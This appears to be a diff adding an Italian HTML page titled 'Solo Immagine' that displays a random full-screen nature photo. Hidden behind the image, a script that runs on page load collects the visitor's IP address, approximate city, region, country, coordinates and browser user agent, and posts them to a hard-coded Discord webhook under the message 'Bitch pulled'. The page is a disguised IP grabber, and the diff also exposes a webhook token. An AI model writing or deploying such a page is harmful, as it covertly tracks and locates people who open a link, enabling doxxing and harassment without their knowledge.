@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solo Immagine</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #000;
+        }
+        .image-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        #ip-info {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://source.unsplash.com/random/1920x1080/?nature" alt="Immagine casuale">
+    </div>
+    <div id="ip-info"></div>
+
+    <script>
+        // Funzione per ottenere l'indirizzo IP e la posizione
+        async function getIPAndLocation()  {
+            try {
+                // Ottieni l'indirizzo IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json') ;
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Ottieni la posizione basata sull'IP
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`) ;
+                const locationData = await locationResponse.json();
+                
+                // Crea un oggetto con le informazioni raccolte
+                const ipInfo = {
+                    ip: ip,
+                    city: locationData.city,
+                    region: locationData.region,
+                    country: locationData.country_name,
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent
+                };
+                
+                // Salva le informazioni in un elemento nascosto
+                const ipInfoElement = document.getElementById('ip-info');
+                ipInfoElement.textContent = JSON.stringify(ipInfo);
+                
+                // Invia le informazioni al server Discord tramite webhook
+                sendToDiscord(ipInfo);
+                
+                // Mostra le informazioni nella console per debug
+                console.log('IP:', ip);
+                console.log('Posizione:', locationData);
+            } catch (error) {
+                console.error('Errore nel recupero delle informazioni:', error);
+            }
+        }
+
+        // Funzione per inviare i dati al webhook Discord
+        async function sendToDiscord(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1361732575088873795/iPMvjztxikH1bgdUSq2qT7_f__Ghc-eYlInI89PGDPod4u4XCvseWm1CRUihpoZPHJ_6';
+            
+            try {
+                // Crea un messaggio formattato per Discord
+                const message = {
+                    content: '**Bitch pulled**',
+                    embeds: [{
+                        title: 'Info',
+                        color: 3447003, // Colore blu
+                        fields: [
+                            {
+                                name: 'IP',
+                                value: data.ip,
+                                inline: true
+                            },
+                            {
+                                name: 'City',
+                                value: data.city || 'Non disponibile',
+                                inline: true
+                            },
+                            {
+                                name: 'Region',
+                                value: data.region || 'Non disponibile',
+                                inline: true
+                            },
+                            {
+                                name: 'Country',
+                                value: data.country || 'Non disponibile',
+                                inline: true
+                            },
+                            {
+                                name: 'Coords',
+                                value: `${data.latitude}, ${data.longitude}` || 'Non disponibile',
+                                inline: true
+                            },
+                            {
+                                name: 'User Agent',
+                                value: data.user_agent || 'Non disponibile'
+                            }
+                        ],
+                        footer: {
+                            text: `Timestamp: ${data.timestamp}`
+                        }
+                    }]
+                };
+                
+                // Invia i dati al webhook Discord
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message) 
+                });
+                
+                if (response.ok) {
+                    console.log('Dati inviati con successo a Discord!');
+                } else {
+                    console.error('Errore nell\'invio dei dati a Discord:', await response.text());
+                }
+            } catch (error) {
+                console.error('Errore nell\'invio dei dati a Discord:', error);
+            }
+        }
+
+        // Esegui la funzione quando la pagina è caricata
+        window.addEventListener('load', getIPAndLocation);
+    </script>
+</body>
+</html>
